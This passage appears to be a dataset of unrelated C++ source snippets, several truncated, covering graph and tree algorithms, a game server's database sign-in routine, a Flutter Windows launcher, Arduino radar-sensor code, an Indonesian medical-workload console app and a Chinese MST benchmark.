art.addEdge(4,1);\n    art.build();\n    cout << \"Articulation points: \";\n    for (auto &x : art.articulationPoints) {\n        cout << x << \" \";\n    }\n    cout << \"\\nBridges:\\n\";\n    for (auto &b : art.bridges) {\n        cout << b.first << \"-\" << b.second << \"\\n\";\n    }\n}\n\n// 5) Demo Floyd & Dijkstra\nvoid demoFloyd_Dijkstra() {\n    cout << \"\\n--- Demo Floyd Warshall & Dijkstra ---\\n\";\n    // Gi\u1ea3 s\u1eed graph 4 nodes, adjacency matrix cho Floyd\n    const long long INF = LLONG_MAX;\n    vector<vector<long long>> dist = {\n        {0,   3, INF, 5  },\n        {2,   0,   8, INF},\n        {INF, INF, 0,   1},\n        {INF, INF, INF, 0},\n    };\n    floydWarshall(dist);\n    cout << \"Floyd distance matrix:\\n\";\n    for(int i=0;i<(int)dist.size();i++){\n        for(int j=0;j<(int)dist.size();j++){\n            if(dist[i][j]==INF) cout << \"INF \";\n            else cout << dist[i][j] << \" \";\n        }\n        cout << \"\\n\";\n    }\n\n    // Demo Dijkstra (list)\n    vector<vector<pair<int,int>>> adj = {\n       {{1,3},{3,5}},    // node 0 -> (1,3),(3,5)\n       {{0,2},{2,8}},    // node 1 -> (0,2),(2,8)\n       {{3,1}},          // node 2 -> (3,1)\n       {}                // node 3\n    };\n    auto distDij = dijkstra(0, adj);\n    cout << \"Dijkstra dist from 0: \";\n    for (auto &x : distDij) {\n        if(x==LLONG_MAX) cout << \"INF \";\n        else cout << x << \" \";\n    }\n    cout << \"\\n\";\n}\n\n// 6) Demo DSU & MST (Kruskal)\nvoid demoDSU_MST() {\n    cout << \"\\n--- Demo DSU & Kruskal MST ---\\n\";\n    // 5 nodes, edges\n    vector<tuple<long long,int,int>> edges = {\n        {1, 0,1},\n        {4, 1,2},\n        {3, 0,2},\n        {2, 2,3},\n        {10,1,3},\n        {5, 3,4}\n    };\n    long long costMST = kruskal(edges, 5);\n    cout << \"MST cost = \" << costMST << \"\\n\";\n}\n\n// 7) Demo Max Flow (Dinic) & Bipartite Matching (Hopkroft-Karp)\nvoid demoFlows() {\n    cout << \"\\n--- Demo Dinic MaxFlow ---\\n\";\n    // Graph (4 nodes: s=0, t=3)\n    Dinic dinic(4, 0, 3);\n    dinic.addEdge(0,1,10);\n    dinic.addEdge(0,2,5);\n    dinic.addEdge(1,2,15);\n    dinic.addEdge(1,3,10);\n    dinic.addEdge(2,3,10);\n    cout << \"Max flow = \" << dinic.maxFlow() << \"\\n\";\n\n    cout << \"\\n--- Demo Hopkroft-Karp ---\\n\";\n    // Bipartite: U={1..3}, V={1..4}\n    HopkroftKarp hk(3, 4);\n    /*\n       U1 -> V2, V3\n       U2 -> V1, V2\n       U3 -> V4\n    */\n    hk.addEdge(1,2);\n    hk.addEdge(1,3);\n    hk.addEdge(2,1);\n    hk.addEdge(2,2);\n    hk.addEdge(3,4);\n    cout << \"Maximum bipartite matching = \" << hk.maxMatching() << \"\\n\";\n}\n\n// 8) Demo Fenwick & SegmentTree & SparseTable\nvoid demoFenw_Seg_Sparse() {\n    cout << \"\\n--- Demo Fenwick (BIT) ---\\n\";\n    Fenwick fenw(5);",
    "#include \"CDBSystem.h\"\n#include \"../PacketProcessor/CMatchingPacketProcessor.h\"\n\n#define SQL_VCHAR_DEFAULT_LENGTH 50\n#define MAIL_REWARDS_JSON_LENGTH 512\n\nusing namespace SERVER::NETWORKMODEL::IOCP;\n\nCDBSystem::CDBSystem(const std::string& sHostName, const std::string& sDBName, const std::string& sUserName, const std::string& sPassword, const uint16_t iMaxPoolConnection, const std::function<void(FPacketProcessingData*)> dbRequestProcessedCallback)\n\t: m_sqlPool(sHostName, sDBName, sUserName, sPassword, iMaxPoolConnection * 2), m_bDBThreadRunState(true), m_dbThreadLoopDuration(std::chrono::milliseconds(125)), m_dbRequestProcessedCallback(dbRequestProcessedCallback) {\n\n\tm_requestProcessor.emplace(EDBRequestType::EDBType_SignInRequest, std::bind(&CDBSystem::SignIn, this, std::placeholders::_1));\n\n\tm_pDBRequestProcessingQueue = std::make_unique<DB_QUEUE_TYPE>();\n\tm_pDBRequestStockQueue = std::make_unique<DB_QUEUE_TYPE>();\n\n\tm_dbRequestProcessingThread = std::thread(std::bind(&CDBSystem::DBWorkerThread, this));\n}\n\nCDBSystem::~CDBSystem() {\n\tm_bDBThreadRunState = false;\n\tif (m_dbRequestProcessingThread.joinable())\n\t\tm_dbRequestProcessingThread.join();\n}\n\n\nvoid CDBSystem::DBWorkerThread() {\n\twhile (m_bDBThreadRunState) {\n\t\t// add cv\n\n\t\tif (m_pDBRequestProcessingQueue->IsEmpty() && !m_pDBRequestStockQueue->IsEmpty()) {\n\t\t\tm_csForDBWorkerThread.lock();\n\t\t\tm_pDBRequestStockQueue.swap(m_pDBRequestProcessingQueue);\n\t\t\tm_csForDBWorkerThread.unlock();\n\t\t}\n\n\t\tFDBBaseQueueData* pQueueData = nullptr;\n\t\tif (m_pDBRequestProcessingQueue->Pop(pQueueData)) {\n\t\t\tauto findResult = m_requestProcessor.find(pQueueData->m_requestType);\n\t\t\tif (findResult != m_requestProcessor.cend()) {\n\t\t\t\tif (auto pRet = findResult->second(pQueueData))\n\t\t\t\t\tm_dbRequestProcessedCallback(new FPacketProcessingData(static_cast<CONNECTION*>(pQueueData->m_pRequestedClientConnection), pQueueData->m_requestType, pRet));\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid CDBSystem::AddNewDBRequestData(FDBBaseQueueData* pNewQueueData) {\n\tstd::unique_lock<std::mutex> lck(m_csForDBWorkerThread);\n\tm_pDBRequestStockQueue->Push(pNewQueueData);\n}\n\nstd::shared_ptr<void> CDBSystem::SignIn(void* const pRequestData) {\n\tusing namespace SERVER::FUNCTIONS::UTIL;\n\n\tif (auto pSignInRequest = static_cast<FDBSignInRequest* const>(pRequestData)) {\n\t\tauto pSTMT = m_sqlPool.GetConnection()->AllocSTMT();\n\n\t\tSQLPrepare(*pSTMT, (SQLWCHAR*)L\"{call sign_in_by_epic_id (?, ?)}\", SQL_NTS);\n\t\t\n\t\tSQLBindParameter(*pSTMT, 1, SQL_PARAM_INPUT, SQL_C_CHAR, SQL_CHAR, EPIC_USER_ID_LENGTH, 0, pSignInRequest->m_sEpicUserID, 0, NULL);\n\t\tSQLBindParameter(*pSTMT, 2, SQL_PARAM_INPUT, SQL_C_LONG, SQL_BIGINT, 0, 0, &pSignInRequest->m_iUUID, sizeof(SQLINTEGER), NULL);\n\n\t\tif (SQLExecute(*pSTMT) != SQL_SUCCESS)\n\t\t\tGetMSSQLErrorMessage(SQL_HANDLE_STMT, *pSTMT);\n\t\telse {\n\t\t\tif (SQLFetch(*pSTMT) == SQL_SUCCESS) {\n\t\t\t\tSQLGetData(*pSTMT, 1, SQL_C_LONG, &pSignInRequest->m_iUUID, sizeof(SQLINTEGER), NULL);\n\t\t\t\tSQLGetData(*pSTMT, 2, SQL_C_CHAR, pSignInRequest->m_sUserName, MAX_NVARCHAR_LENGTH, NULL);\n\t\t\t}\n\t\t\tSQLFreeStmt(*pSTMT, SQL_CLOSE);\n\n\t\t\tpSignInRequest->m_requestResult = MakeDetailMessageType(FlatPacket::RequestMessageType_Succeeded, (strlen(pSignInRequest->m_sUserName) > 0) ? FlatPacket::SignInMessageDetail_ExistsUser : FlatPacket::SignInMessageDetail_NewUser);\n\t\t}\n\t\treturn std::shared_ptr<void>(pSignInRequest);\n\t}\n\treturn nullptr;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_lest_go_router\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"SpaceSectorLLRBT.h\"\n\nusing namespace std;\n\nSpaceSectorLLRBT::SpaceSectorLLRBT() : root(nullptr) {}\n\nvoid SpaceSectorLLRBT::readSectorsFromFile(const std::string& filename) {\n    ifstream file(filename);\n\n    if (file.is_open()) {\n        string line;\n\n        getline(file, line);\n        while (getline(file, line)) {\n            vector<string> locations;\n            stringstream iss(line);\n            string location;\n\n            while (getline(iss, location, ',')) {\n                locations.push_back(location);\n            }\n            insertSectorByCoordinates(std::stoi(locations[0]), std::stoi(locations[1]), std::stoi(locations[2]));\n        }\n        file.close();\n    }\n}\nSpaceSectorLLRBT::~SpaceSectorLLRBT() {\n    for(Sector* sector:allSectors){\n        delete sector;\n    }\n}\nvoid SpaceSectorLLRBT::insertSectorByCoordinates(int x, int y, int z) {\n    insertSector(root,x,y,z);\n    balanceControl(allSectors.back());\n    root->color= false;\n}\nSector* SpaceSectorLLRBT::insertSector(Sector* sector , int x , int y , int z){\n    if (sector== nullptr){\n        sector=new Sector(x,y,z);\n        if (root== nullptr){\n            sector->color= false;\n            root=sector;\n        }\n        else{sector->color= true;}\n        allSectors.push_back(sector);\n        return  sector;\n    }\n    else{\n        int control;\n\n        if (sector->x != x){control= x > sector->x ? 1 : 0;}\n        else if (sector->y!=y){control= y > sector->y ? 1 : 0;}\n        else if (sector->z!=z){control= z > sector->z ? 1 : 0;}\n        else{control=-1;}\n\n        if (control){\n            sector->right= insertSector(sector->right,x,y,z);\n            sector->right->parent=sector;\n        } else{\n            sector->left= insertSector(sector->left,x,y,z);\n            sector->left->parent=sector;\n        }\n        return  sector;\n    }\n}\nvoid SpaceSectorLLRBT::balanceControl(Sector* sector){\n    if (sector->parent!= nullptr){\n        if (sector->parent->right!= nullptr&&sector->parent->left!= nullptr&&sector->parent->right->color && sector->parent->left->color){\n            colorFlip(sector);\n            balanceControl(sector->parent);\n        }\n        else if (sector->parent->right!= nullptr&&sector->parent->right==sector && sector->color){\n            leftRotate(sector);\n            balanceControl(sector->left);\n        }\n        else if (sector->parent->color && sector->color){\n            rightRotate(sector);\n            balanceControl(sector);\n        }\n    }\n}\nvoid  SpaceSectorLLRBT::colorFlip(Sector* sector){\n    sector->parent->right->color= false;\n    sector->parent->left->color= false;\n    sector->parent->color= true;\n}\n\nvoid SpaceSectorLLRBT::leftRotate(Sector* sector){\n    if (root->right!= nullptr&&root->right==sector){\n        root=root->right;\n    }\n    Sector* parentSector=sector->parent;\n    if (parentSector->parent!= nullptr){\n        sector->parent=parentSector->parent;\n        if (parentSector->parent->right==parentSector){\n            parentSector->parent->right=sector;\n        }\n        else{\n            parentSector->parent->left=sector;\n        }\n    }\n    else{sector->parent= nullptr;}\n    parentSector->parent=sector;\n    bool colorOfParent=parentSector->color;\n    bool colorOfSector=sector->color;\n    sector->color= colorOfParent;\n    parentSector->color= colorOfSector;\n    if (sector->left!= nullptr){\n        parentSector->right=sector->left;\n        parentSector->right->parent=parentSector;\n    }\n    else{\n        parentSector->right= nullptr;\n    }\n    sector->left=parentSector;\n}\n\nvoid SpaceSectorLLRBT::rightRotate(Sector* sector){\n    if (root->left!= nullptr&&root->left==sector->parent){\n        root=root->left;\n    }\n    Sector* parentSector=sector->parent;\n    Sector* grandParentSector=sector->parent->parent;\n\n    if (grandParentSector->parent!= nullptr){\n        parentSector->parent=grandParentSector->parent;\n\n        if (grandParentSector->parent->right==grandParentSector){\n            grandParentSector->parent->right=parentSector;\n        }\n        else{\n            grandParentSector->parent->left=parentSector;\n        }\n    }\n    else{parentSector->parent= nullptr;}\n\n    grandParentSector->parent=parentSector;\n\n    bool colorOfParentSector=parentSector->color;\n    parentSector->color= grandParentSector->color;\n    grandParentSector->color= colorOfParentSector;\n\n    if (parentSector->right!= nullptr){\n        grandParentSector->left=parentSector->right;\n        grandParentSector->left->parent=grandParentSector;\n    } else{grandParentSector->left= nullptr;\n    }\n    parentSector->right=grandParentSector;\n}\n\nvoid SpaceSectorLLRBT::displaySectorsInOrder() {\n\n    std::cout<<\"Space sectors inorder traversal:\"<<std::endl;\n    inorder(root);\n    std::cout<<endl;\n}\n\nvoid SpaceSectorLLRBT::displaySectorsPreOrder() {\n    std::cout<<\"Space sectors preorder traversal:\"<<std::endl;\n    preorder(root);\n    std::cout<<endl;\n}\n\nvoid SpaceSectorLLRBT::displaySectorsPostOrder() {\n    std::cout<<\"Space sectors ",
    "#include <memory>\n#include <stdexcept>\n#include <iostream>\n#include <vector>\n#include <algorithm>\n\ntemplate<typename T>\nclass AVLTree {\nprivate:\n    struct Node {\n        T data;\n        std::unique_ptr<Node> left;\n        std::unique_ptr<Node> right;\n        int height;\n        \n        Node(const T& value) : data(value), height(1) {}\n    };\n    \n    std::unique_ptr<Node> root;\n    \n    int getHeight(const Node* node) const {\n        return node ? node->height : 0;\n    }\n    \n    int getBalance(const Node* node) const {\n        return node ? getHeight(node->left.get()) - getHeight(node->right.get()) : 0;\n    }\n    \n    void updateHeight(Node* node) {\n        node->height = 1 + std::max(getHeight(node->left.get()), \n                                  getHeight(node->right.get()));\n    }\n    \n    std::unique_ptr<Node> rightRotate(std::unique_ptr<Node> y) {\n        auto x = std::move(y->left);\n        auto T2 = std::move(x->right);\n        \n        x->right = std::move(y);\n        x->right->left = std::move(T2);\n        \n        updateHeight(x->right.get());\n        updateHeight(x.get());\n        \n        return x;\n    }\n    \n    std::unique_ptr<Node> leftRotate(std::unique_ptr<Node> x) {\n        auto y = std::move(x->right);\n        auto T2 = std::move(y->left);\n        \n        y->left = std::move(x);\n        y->left->right = std::move(T2);\n        \n        updateHeight(y->left.get());\n        updateHeight(y.get());\n        \n        return y;\n    }\n    \n    std::unique_ptr<Node> insert(std::unique_ptr<Node> node, const T& value) {\n        if (!node) {\n            return std::make_unique<Node>(value);\n        }\n        \n        if (value < node->data) {\n            node->left = insert(std::move(node->left), value);\n        } else if (value > node->data) {\n            node->right = insert(std::move(node->right), value);\n        } else {\n            return node; // No dupe values\n        }\n        \n        updateHeight(node.get());\n        \n        int balance = getBalance(node.get());\n        \n        // Left Left Case\n        if (balance > 1 && value < node->left->data) {\n            return rightRotate(std::move(node));\n        }\n        \n        // Right Right Case\n        if (balance < -1 && value > node->right->data) {\n            return leftRotate(std::move(node));\n        }\n        \n        // Left Right Case\n        if (balance > 1 && value > node->left->data) {\n            node->left = leftRotate(std::move(node->left));\n            return rightRotate(std::move(node));\n        }\n        \n        // Right Left Case\n        if (balance < -1 && value < node->right->data) {\n            node->right = rightRotate(std::move(node->right));\n            return leftRotate(std::move(node));\n        }\n        \n        return node;\n    }\n    \n    void inorderTraversal(const Node* node, std::vector<T>& result) const {\n        if (node) {\n            inorderTraversal(node->left.get(), result);\n            result.push_back(node->data);\n            inorderTraversal(node->right.get(), result);\n        }\n    }\n\npublic:\n    AVLTree() = default;\n    \n    void insert(const T& value) {\n        root = insert(std::move(root), value);\n    }\n    \n    std::vector<T> getInorder() const {\n        std::vector<T> result;\n        inorderTraversal(root.get(), result);\n        return result;\n    }\n};\n\nint main() {\n    try {\n        AVLTree<int> tree;\n        std::vector<int> values = {10, 20, 30, 40, 50, 25};\n        \n        for (const auto& value : values) {\n            tree.insert(value);\n        }\n        \n        std::cout << \"Inorder traversal: \";\n        for (const auto& value : tree.getInorder()) {\n            std::cout << value << \" \";\n        }\n        std::cout << std::endl;\n        \n    } catch (const std::exception& e) {\n        std::cerr << \"Error: \" << e.what() << std::endl;\n        return 1;\n    }\n    \n    return 0;\n}\n",
    "#include <Arduino.h>\r\n#include <HardwareSerial.h>\r\n\r\n#define RX_PIN 16\r\n#define TX_PIN 17\r\n\r\nHardwareSerial radarSerial(1);\r\n\r\nbool radarReady = false;\r\nbool targetInRange = false;\r\nuint8_t buff[64] = {0};\r\nuint8_t buffIndex = 0;\r\nuint16_t range;\r\n\r\nvoid sendCommand(uint8_t *command, size_t length) {\r\n  radarSerial.write(command, length);\r\n}\r\n\r\nvoid readFirmwareVersion() {\r\n  uint8_t firmwareCommand[] = {\r\n    0xFD, 0xFC, 0xFB, 0xFA, // Frame Header\r\n    0x02, 0x00, // Data Length (2 bytes follow)\r\n    0x00, 0x00, // Command Word\r\n    0x04, 0x03, 0x02, 0x01 // Frame Footer\r\n  };\r\n\r\n  sendCommand(firmwareCommand, sizeof(firmwareCommand));\r\n  delay(100);\r\n\r\n  bool versionReceived = false;\r\n\r\n  while (radarSerial.available()) {\r\n    if (radarSerial.read() == 0xFD \r\n     && radarSerial.read() == 0xFC \r\n     && radarSerial.read() == 0xFB \r\n     && radarSerial.read() == 0xFA) {\r\n\r\n      radarSerial.read(); // Skip byte 1\r\n      radarSerial.read(); // Skip byte 2\r\n\r\n      if (radarSerial.read() == 0x00 && radarSerial.read() == 0x01) { // ACK\r\n        uint8_t major = radarSerial.read();\r\n        uint8_t minor = radarSerial.read();\r\n        uint8_t patch = radarSerial.read();\r\n\r\n        Serial.printf(\"Firmware Version: %d.%d.%d\\n\", major, minor, patch);\r\n\r\n        versionReceived = true;\r\n        break;       \r\n      }\r\n    }\r\n  }\r\n\r\n  if (!versionReceived) {\r\n    Serial.println(\"Failed to read firmware version\");\r\n  }\r\n}\r\n\r\nvoid setDistanceCalibration(int32_t calibrationValue) {\r\n  uint8_t enableCommand[] = {\r\n    0xFD, 0xFC, 0xFB, 0xFA, // Frame Header\r\n    0x04, 0x00, // Data Length (4 bytes follow)\r\n    0xFF, 0x00, // Command Word for Enable Configuration\r\n    0x01, 0x00, // End of Frame\r\n    0x04, 0x03, 0x02, 0x01 // Frame Footer\r\n  };\r\n  \r\n  sendCommand(enableCommand, sizeof(enableCommand));\r\n  delay(100);\r\n\r\n  Serial.print(\"Enabled Configurtion ACK:\");\r\n  bool enableAckReceived = false;\r\n\r\n  while (radarSerial.available()) {\r\n    uint8_t byte = radarSerial.read();\r\n\r\n    if (byte == 0xFD && radarSerial.read() == 0xFC) {\r\n      enableAckReceived = true;\r\n      Serial.printf(\"0x%02X\\n\", byte);\r\n    } else if (enableAckReceived) {\r\n      Serial.printf(\"0x%02X\\n\", byte);\r\n      if (byte == 0x01) break;\r\n    }\r\n  }\r\n  Serial.println();\r\n\r\n  if (!enableAckReceived) {\r\n    Serial.println(\"Enable Configuration ACK not received\");\r\n    return;\r\n  }\r\n\r\n  uint8_t calibrationCommand[] = {\r\n    0xFD, 0xFC, 0xFB, 0XFA, // Frame Header\r\n    0x08, 0x00, // Data Length (8 bytes follow)\r\n    0x72, 0x00, // Command Word for Distance Calibration\r\n    0x00, 0x00, // Distance Calibration Parameter Number\r\n    (uint8_t)(calibrationValue & 0xFF), // Calibration Value byte 1\r\n    (uint8_t)((calibrationValue >> 8) & 0xFF), // Calibration Value byte 2\r\n    (uint8_t)((calibrationValue >> 16) & 0xFF), // Calibration Value byte 3\r\n    (uint8_t)((calibrationValue >> 24) & 0xFF), // Calibration Value byte 4\r\n    0x04, 0x03, 0x02, 0x01 // Frame Footer\r\n  };\r\n\r\n  sendCommand(calibrationCommand, sizeof(calibrationCommand));\r\n  delay(100);\r\n\r\n  Serial.print(\"Distance Calibration ACK:\");\r\n  bool calibrationAckReceived = false;\r\n\r\n  while (radarSerial.available()) {\r\n    uint8_t byte = radarSerial.read();\r\n    Serial.printf(\"0x%02X\\n\", byte);\r\n    \r\n    if (byte == 0x01) {\r\n      calibrationAckReceived = true;\r\n      break;\r\n    }\r\n  }\r\n\r\n  Serial.println();\r\n\r\n  if (calibrationAckReceived) {\r\n    Serial.println(\"Distance Calibration Command Successful\");\r\n  } else {\r\n    Serial.println(\"Distance Calibration Command Failed\");\r\n  }\r\n\r\n  uint8_t disableCommand[] = {\r\n    0xFD, 0xFC, 0xFB, 0xFA, // Frame Header\r\n    0x02, 0x00, // Data Length (2 bytes follow)\r\n    0xFE, 0x00, // Command Word for Disable Configuration\r\n    0x04, 0x03, 0x02, 0x01 // Frame Footer\r\n  };\r\n\r\n  sendCommand(disableCommand, sizeof(disableCommand));\r\n  delay(100);\r\n\r\n  Serial.print(\"Calibration Ended\");\r\n}\r\n\r\nvoid checkRadar() {\r\n  while (radarSerial.available()) {\r\n    uint8_t byte = radarSerial.read();\r\n    buff[buffIndex++] = byte;\r\n\r\n    if (buffIndex >= 5) { // Min 5 bytes needed\r\n      if (buff[0] == 0xAA\r\n       && buff[buffIndex - 1] == 0x55) { // Extract Distance & Gesture\r\n\r\n        range = (buff[2] << 8) | buff[1]; // Distance bytes\r\n        uint8_t gesture = buff[3]; // Gesture byte\r\n        float distInMeters = range / 100.0; // cm > m\r\n       \r\n        Serial.printf(\"Distance: %.2f m, Gesture: %d, Micro Motion: %d\\n\", distInMeters, gesture);\r\n\r\n        if (gesture == 0x01) {\r\n          Serial.println(\"Gesture\");\r\n        }\r\n\r\n        memset(buff, 0, sizeof(buff));\r\n        buffIndex = 0;\r\n      } else {\r\n        if (buffIndex >= sizeof(buff)) {\r\n          memset(buff, 0, sizeof(buff));\r\n          buffIndex = 0;\r\n        }\r\n      }\r\n    }\r\n  }\r\n}\r\n\r\nvoid setup() {\r\n  Serial.begin(115200);\r\n  while (!Serial) ;\r\n\r\n  Serial.println(\"Radar Firmware Version Reader\");\r\n\r\n  radarSerial.begin(256000, SERIAL_8N1, RX_PIN, TX_PIN);\r\n  delay(1000);\r\n\r\n  readFirmwareVersion()",
    "#include <iostream>\r\n#include <fstream>\r\n#include <iomanip>\r\n#include <vector>\r\n#include <string>\r\n#include \"json.hpp\"\r\n\r\nusing json = nlohmann::json;\r\nusing namespace std;\r\n\r\nstruct Medis {\r\n    int id;\r\n    string nama;\r\n    string jabatan;\r\n    int jumlahPasien;\r\n};\r\n\r\nvector<Medis> bacaDataDariJson(const string& namaFile) {\r\n    vector<Medis> dataMedis;\r\n    ifstream file(namaFile);\r\n\r\n    if (file.is_open()) {\r\n        json dataArray;\r\n        file >> dataArray;\r\n        file.close();\r\n\r\n        for (const auto& item : dataArray) {\r\n            Medis medis = {\r\n                item[\"id\"],\r\n                item[\"nama\"],\r\n                item[\"jabatan\"],\r\n                item[\"jumlahPasien\"]\r\n            };\r\n            dataMedis.push_back(medis);\r\n        }\r\n    }\r\n\r\n    return dataMedis;\r\n}\r\n\r\nvoid tulisDataKeJson(const string& namaFile, const vector<Medis>& dataMedis) {\r\n    json dataArray;\r\n    for (const auto& medis : dataMedis) {\r\n        dataArray.push_back({\r\n            {\"id\", medis.id},\r\n            {\"nama\", medis.nama},\r\n            {\"jabatan\", medis.jabatan},\r\n            {\"jumlahPasien\", medis.jumlahPasien}\r\n        });\r\n    }\r\n\r\n    ofstream file(namaFile);\r\n    if (file.is_open()) {\r\n        file << dataArray.dump(4) << endl;\r\n        file.close();\r\n    }\r\n}\r\n\r\nvoid tampilkanMenu() {\r\n    cout << \"\\n============================\" << endl;\r\n    cout << \"  ANALISIS BEBAN KERJA MEDIS\" << endl;\r\n    cout << \"============================\" << endl;\r\n    cout << \"1. Tambah Data Tenaga Medis\" << endl;\r\n    cout << \"2. Tampilkan Data Tenaga Medis\" << endl;\r\n    cout << \"3. Hitung Rata-Rata Beban Kerja\" << endl;\r\n    cout << \"4. Ubah Data Tenaga Medis\" << endl;\r\n    cout << \"5. Hapus Data Tenaga Medis\" << endl;\r\n    cout << \"6. Keluar\" << endl;\r\n    cout << \"Pilih opsi: \";\r\n}\r\n\r\nvoid tampilkanData(const vector<Medis>& dataMedis) {\r\n    if (dataMedis.empty()) {\r\n        cout << \"Belum ada data tenaga medis yang dimasukkan.\\n\";\r\n        return;\r\n    }\r\n\r\n    cout << \"\\n-----------------------------------------------------\" << endl;\r\n    cout << \"| \" << setw(5) << left << \"ID\"\r\n         << \"| \" << setw(20) << left << \"Nama\"\r\n         << \"| \" << setw(15) << left << \"Jabatan\"\r\n         << \"| \" << setw(10) << left << \"Pasien\" << \"|\" << endl;\r\n    cout << \"-----------------------------------------------------\" << endl;\r\n\r\n    for (const auto& medis : dataMedis) {\r\n        cout << \"| \" << setw(5) << left << medis.id\r\n             << \"| \" << setw(20) << left << medis.nama\r\n             << \"| \" << setw(15) << left << medis.jabatan\r\n             << \"| \" << setw(10) << left << medis.jumlahPasien << \"|\" << endl;\r\n    }\r\n\r\n    cout << \"-----------------------------------------------------\" << endl;\r\n}\r\n\r\nvoid hitungRataRata(const vector<Medis>& dataMedis) {\r\n    if (dataMedis.empty()) {\r\n        cout << \"Belum ada data untuk menghitung rata-rata beban kerja.\\n\";\r\n        return;\r\n    }\r\n\r\n    int totalPasien = 0;\r\n    for (const auto& medis : dataMedis) {\r\n        totalPasien += medis.jumlahPasien;\r\n    }\r\n\r\n    double rataRata = static_cast<double>(totalPasien) / dataMedis.size();\r\n    cout << \"Rata-rata beban kerja tenaga medis: \" << fixed << setprecision(2) << rataRata << \" pasien per tenaga medis.\\n\";\r\n}\r\n\r\nvoid ubahData(vector<Medis>& dataMedis, const string& namaFile) {\r\n    if (dataMedis.empty()) {\r\n        cout << \"Tidak ada data yang dapat diubah.\\n\";\r\n        return;\r\n    }\r\n\r\n    int id;\r\n    cout << \"Masukkan ID tenaga medis yang ingin diubah: \";\r\n    cin >> id;\r\n\r\n    for (auto& medis : dataMedis) {\r\n        if (medis.id == id) {\r\n            cout << \"Masukkan nama baru (tekan Enter untuk melewati): \";\r\n            cin.ignore();\r\n            string namaBaru;\r\n            getline(cin, namaBaru);\r\n            if (!namaBaru.empty()) medis.nama = namaBaru;\r\n\r\n            cout << \"Masukkan jabatan baru (tekan Enter untuk melewati): \";\r\n            string jabatanBaru;\r\n            getline(cin, jabatanBaru);\r\n            if (!jabatanBaru.empty()) medis.jabatan = jabatanBaru;\r\n\r\n            cout << \"Masukkan jumlah pasien baru (tekan 0 untuk melewati): \";\r\n            int jumlahPasienBaru;\r\n            cin >> jumlahPasienBaru;\r\n            if (jumlahPasienBaru > 0) medis.jumlahPasien = jumlahPasienBaru;\r\n\r\n            tulisDataKeJson(namaFile, dataMedis);\r\n            cout << \"Data berhasil diubah!\\n\";\r\n            return;\r\n        }\r\n    }\r\n\r\n    cout << \"Data dengan ID tersebut tidak ditemukan.\\n\";\r\n}\r\n\r\nvoid hapusData(vector<Medis>& dataMedis, const string& namaFile) {\r\n    if (dataMedis.empty()) {\r\n        cout << \"Tidak ada data yang dapat dihapus.\\n\";\r\n        return;\r\n    }\r\n\r\n    int id;\r\n    cout << \"Masukkan ID tenaga medis yang ingin dihapus: \";\r\n    cin >> id;\r\n\r\n    auto it = remove_if(dataMedis.begin(), dataMedis.end(), [id](const Medis& medis) {\r\n        return medis.id == id;\r\n    });\r\n\r\n    if (it != dataMedis.end()) {\r\n        dataMedis.erase(it, dataMedis.end());\r\n\r\n        // Perbarui ID a",
    "#include \"Graph.h\"\n#include \"MST.h\"\n#include <iostream>\n#include <chrono>\n#include <iomanip>\n#include <windows.h>\n\n// \u6253\u5370MST\u7684\u7ed3\u679c\nvoid printMSTResult(const std::pair<int, std::vector<Edge>>& result, const Graph& graph) {\n    std::cout << \"\u6700\u5c0f\u751f\u6210\u6811\u7684\u603b\u6743\u91cd: \" << result.first << std::endl;\n    std::cout << \"\u8fb9\u7684\u5217\u8868:\" << std::endl;\n    for (const Edge& e : result.second) {\n        std::cout << graph.getCityName(e.from) << \" -- \" \n                 << graph.getCityName(e.to) << \" (\u6743\u91cd: \" \n                 << e.weight << \")\" << std::endl;\n    }\n    std::cout << std::endl;\n}\n\n// \u8fd0\u884c\u6027\u80fd\u6d4b\u8bd5\uff0c\u6bd4\u8f83\u4e0d\u540c\u7b97\u6cd5\u7684\u6267\u884c\u65f6\u95f4\nvoid runPerformanceTest(const Graph& graph) {\n    // \u6d4b\u8bd5\u57fa\u672cPrim\u7b97\u6cd5\n    auto start = std::chrono::high_resolution_clock::now();\n    auto result = MST::prim(graph);\n    auto end = std::chrono::high_resolution_clock::now();\n    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);\n    std::cout << \"Prim\u7b97\u6cd5\u6267\u884c\u65f6\u95f4: \" << duration.count() << \" \u5fae\u79d2\" << std::endl;\n\n    // \u6d4b\u8bd5\u4f18\u5316\u7684Prim\u7b97\u6cd5\n    start = std::chrono::high_resolution_clock::now();\n    result = MST::primWithPQ(graph);\n    end = std::chrono::high_resolution_clock::now();\n    duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);\n    std::cout << \"\u4f18\u5316\u7684Prim\u7b97\u6cd5\u6267\u884c\u65f6\u95f4: \" << duration.count() << \" \u5fae\u79d2\" << std::endl;\n\n    // \u6d4b\u8bd5Kruskal\u7b97\u6cd5\n    start = std::chrono::high_resolution_clock::now();\n    result = MST::kruskal(graph);\n    end = std::chrono::high_resolution_clock::now();\n    duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);\n    std::cout << \"Kruskal\u7b97\u6cd5\u6267\u884c\u65f6\u95f4: \" << duration.count() << \" \u5fae\u79d2\" << std::endl;\n\n    // \u6d4b\u8bd5\u4f18\u5316\u7684Kruskal\u7b97\u6cd5\n    start = 